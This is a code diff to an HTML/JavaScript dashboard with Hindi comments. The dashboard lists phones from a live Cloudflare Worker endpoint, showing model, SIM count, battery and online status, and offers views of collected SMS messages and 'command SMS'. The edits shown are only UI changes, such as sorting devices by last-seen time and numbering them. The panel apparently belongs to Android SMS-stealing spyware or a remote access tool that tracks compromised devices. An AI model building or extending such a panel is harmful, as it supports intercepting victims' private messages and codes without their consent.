@@ -95,7 +95,6 @@
     .contact-item:nth-child(4) { background: linear-gradient(45deg, #11998e, #38ef7d); }
     .contact-item i { font-size:2rem; display:block; margin-bottom:8px; }
 
-    /* SMS और Command Log के लिए स्टाइल */
     .sms-item, .cmd-item {
       background: #f0f0f0;
       padding: 12px;
@@ -145,7 +144,7 @@
 <script>
   (function() {
     // ---------- ⚠️ अपना Worker URL यहाँ डालो ----------
-    const API_BASE = 'https://long-band-8025.vikash6759ub.workers.dev';  // तुम्हारा नया Worker URL
+    const API_BASE = 'https://long-band-8025.vikash6759ub.workers.dev';  // तुम्हारा Worker URL
 
     // ---------- ग्लोबल वेरिएबल ----------
     let devices = [];
@@ -202,12 +201,14 @@
       }
     });
 
-    // ---------- डिवाइस लोड ----------
+    // ---------- डिवाइस लोड करो और नए डिवाइस को सबसे ऊपर रखो ----------
     async function loadDevices() {
       try {
         const res = await fetch(API_BASE + '/api/devices');
         if (!res.ok) throw new Error('Network response was not ok');
         devices = await res.json();
+        // नए डिवाइस सबसे ऊपर दिखाने के लिए lastSeen के आधार पर घटते क्रम में सॉर्ट करो
+        devices.sort((a, b) => (b.lastSeen || 0) - (a.lastSeen || 0));
         renderDeviceList();
       } catch (e) {
         showDialog('Error loading devices: ' + e.message, 'error');
@@ -230,10 +231,17 @@
       const container = document.getElementById('device-list');
       container.innerHTML = devices.map((d, idx) => {
         const bgColor = getDeviceColor(idx);
+        // सीरियल नंबर: idx+1 बड़े अक्षरों में
         return '<div class="device-card" style="background:' + bgColor + ';" data-id="' + d.id + '">' +
-          '<div class="device-info"><h4>' + d.brand + ' ' + d.model + '</h4><p>#' + d.id + ' • SIM ' + d.simCount + '</p></div>' +
-          '<div class="status-badge"><div class="' + (d.online ? 'online' : 'offline') + '">' + (d.online ? '● ONLINE' : '○ OFFLINE') + '</div>' +
-          '<div class="battery">' + d.battery + '%</div></div></div>';
+          '<div class="device-info">' +
+            '<h4>' + d.brand + ' ' + d.model + '</h4>' +
+            '<p>#' + (idx+1) + ' • SIM ' + d.simCount + '</p>' +   // यहाँ नंबर डाला
+          '</div>' +
+          '<div class="status-badge">' +
+            '<div class="' + (d.online ? 'online' : 'offline') + '">' + (d.online ? '● ONLINE' : '○ OFFLINE') + '</div>' +
+            '<div class="battery">' + d.battery + '%</div>' +
+          '</div>' +
+        '</div>';
       }).join('');
       document.querySelectorAll('.device-card').forEach(card => {
         card.addEventListener('click', () => {
@@ -257,7 +265,7 @@
       }
     });
 
-    // ---------- View all SMS (अब डिवाइस जानकारी के साथ) ----------
+    // ---------- View all SMS ----------
     document.getElementById('view-all-sms').addEventListener('click', async function() {
       document.getElementById('dropdown-grid').classList.add('hidden');
       try {
@@ -281,7 +289,7 @@
       } catch (e) { showDialog('Error loading SMS: ' + e.message, 'error'); }
     });
 
-    // ---------- View Command SMS (अब पूरी तरह सही) ----------
+    // ---------- View Command SMS ----------
     document.getElementById('view-command-sms').addEventListener('click', async function() {
       document.getElementById('dropdown-grid').classList.add('hidden');
       try {
